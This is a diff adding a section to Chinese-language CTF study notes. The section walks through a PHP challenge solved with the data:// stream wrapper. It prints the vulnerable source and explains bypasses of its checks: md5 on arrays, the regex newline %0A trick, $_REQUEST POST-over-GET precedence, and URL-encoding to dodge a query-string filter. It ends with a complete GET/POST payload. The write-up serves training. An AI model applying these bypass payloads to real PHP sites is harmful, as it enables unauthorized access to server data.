@@ -5238,6 +5238,101 @@ echo urlencode(serialize($j));
 O%3A8%3A%22just4fun%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BN%3Bs%3A5%3A%22enter%22%3BR%3A2%3B%
 ```
 
+### 伪协议-Lv2（考点：伪协议data读取文件）
+
+```php
+<?php
+highlight_file('index.php');
+echo "Null          ...            Null            ...            Null          ...  ";
+
+if(isset($_GET['src'])) {
+    die(highlight_file('index.php', true));
+}
+
+error_reporting(0);
+if($_REQUEST){
+    foreach ($_REQUEST as $key => $value) {
+        if(preg_match('/[a-zA-Z]/i', $value))   die('Hello Hack.');
+    }
+}
+ 
+if($_SERVER){
+    if(preg_match('/cyber|flag|ciscn/i', $_SERVER['QUERY_STRING']))  die('Hello Hack..');
+}
+ 
+if(isset($_GET['cyber'])){
+    if(!(substr($_GET['cyber'], 32) === md5($_GET['cyber']))){ 
+        die('Hello Hack...');
+    }else{
+        if(preg_match('/^ciscnsec$/', $_GET['ciscn']) && $_GET['ciscn'] !== 'ciscnsec'){
+            $getflag = file_get_contents($_GET['flag']);
+        }else
+    die('Hello Hack....');
+        if(isset($getflag) && $getflag === 'security'){
+            include 'flag.php';
+            echo $flag;
+        }else die('Hello Hack.....');
+    }
+}
+?>
+```
+
+这里的源码中，有三个`if`语句要绕过，我们先看最后的`if`语句
+
+```php
+if(!(substr($_GET['cyber'], 32) === md5($_GET['cyber'])))
+    # var_dump(substr('123', 32)); 		# 当传入的字符串不够长的时候，返回 false
+    # md5 计算数组返回false
+    # 得：cyber[] = 123
+    
+if(preg_match('/^ciscnsec$/', $_GET['ciscn']) && $_GET['ciscn'] !== 'ciscnsec')
+    # 很常见的一个CTF考点，利用 $ 允许字符串最后有一个 \n 的特性，使用 %0A 绕过
+    # 得：ciscn = ciscnsec%0A
+    
+if(isset($getflag) && $getflag === 'security')
+    # 回溯：$getflag = file_get_contents($_GET['flag']);
+    # 很明显就是用伪协议控制输入流，使 $getflag=security，php://input 和 data://text/plain 都试一下
+    # 得：data://text/plain;base64,c2VjdXJpdHk=
+```
+
+再看第一个`if`语句：
+
+**$_REQUEST有一个特性，当GET和POST有相同的变量时，匹配POST的变量，那么就可以同时传参GET和POST即可**，那么直接使用$_POST传值覆盖$_GET
+
+```php
+# 遍历 $_GET 和 $_REQUEST 键值对，如果其中有英文字符就die
+if($_REQUEST){
+    foreach ($_REQUEST as $key => $value) {
+        if(preg_match('/[a-zA-Z]/i', $value))   die('Hello Hack.');
+    }
+}
+```
+
+最后看第二个`if`语句
+
+**`$_SERVER['QUERY_STRING']`，用于获取当前请求的查询字符串部分。查询字符串是位于 URL 中 ? 符号之后的部分，包含了以键值对形式传递的参数。所以我们可以url编码绕过即可**
+
+那么只要将传入的参数中带有`/cyber|flag|ciscn`都做一个URL编码即可
+
+```php
+if($_SERVER){
+    if(preg_match('/cyber|flag|ciscn/i', $_SERVER['QUERY_STRING']))  die('Hello Hack..');
+}
+```
+
+```
+payload：
+GET传参：
+?%63%69%73%63%6E=%63%69%73%63%6Esec%0a
+&%63%79%62%65%72[]=123
+&%66%6C%61%67=data://text/plain;base64,c2VjdXJpdHk=
+
+POST传参：
+ciscn=123&cyber=123&flag=123
+```
+
+![image-20240203222446559](CTF.assets/image-20240203222446559.png)
+
 
 
 # Misc
